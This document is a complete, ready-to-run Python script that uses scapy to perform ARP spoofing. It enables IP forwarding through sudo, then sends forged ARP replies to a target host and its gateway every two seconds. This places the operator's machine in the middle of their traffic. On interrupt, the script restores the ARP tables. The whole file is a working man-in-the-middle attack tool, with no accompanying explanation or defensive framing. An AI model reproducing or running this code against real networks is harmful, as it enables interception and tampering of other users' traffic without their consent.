import scapy.all as scapy
from scapy.layers.l2 import ARP, Ether
import subprocess
import optparse
import re
import time


def get_scan_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target-ip", dest="target_ip", help="Target IP")
    parser.add_option("-g", "--gateway-ip", dest="gateway_ip", help="Gateway IP")
    (arguments, options) = parser.parse_args()
    if not arguments.target_ip or not bool(re.match(r"^(?:\d{1,3}\.){3}\d{1,3}$", arguments.target_ip)):
        print("[-] Invalid input; Please specify a target; Use -h or --help for more info")
        exit(0)
    elif not arguments.gateway_ip or not bool(re.match(r"^(?:\d{1,3}\.){3}\d{1,3}$", arguments.gateway_ip)):
        print("[-] Invalid input; Please specify a target; Use -h or --help for more info")
        exit(0)
    else:
        return arguments


def get_mac_for_ip(ip):
    answered_arp_request_list = scapy.srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=1, verbose=False)[0]
    return answered_arp_request_list[0][1].hwsrc


def spoof(target_ip, gateway_ip):
    target_mac = get_mac_for_ip(target_ip)
    arp_spoof_response_packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
    scapy.send(arp_spoof_response_packet, verbose=False)


def restore(target_ip, gateway_ip):
    target_mac = get_mac_for_ip(target_ip)
    gateway_mac = get_mac_for_ip(gateway_ip)
    arp_spoof_response_packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac)
    scapy.send(arp_spoof_response_packet, verbose=False, count=5)


arguments = get_scan_arguments()

try:
    subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"], stdout=subprocess.DEVNULL,
                   stderr=subprocess.DEVNULL, check=True)
    print("[+] Port forwarding enabled")
    packets_counter = 0
    while True:
        spoof(arguments.target_ip, arguments.gateway_ip)
        spoof(arguments.gateway_ip, arguments.target_ip)
        print("\r[+] Spoofing ==> Packets sent: " + str(packets_counter), end=" ")
        packets_counter += 2
        time.sleep(2)

except KeyboardInterrupt:
    restore(arguments.target_ip, arguments.gateway_ip)
    restore(arguments.gateway_ip, arguments.target_ip)
    print("\n\n[-] Restored ARP tables")
    subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=0"], stdout=subprocess.DEVNULL,
                   stderr=subprocess.DEVNULL, check=True)
    print("[-] Port forwarding disabled")
    print("[-] Exited")
    exit(0)
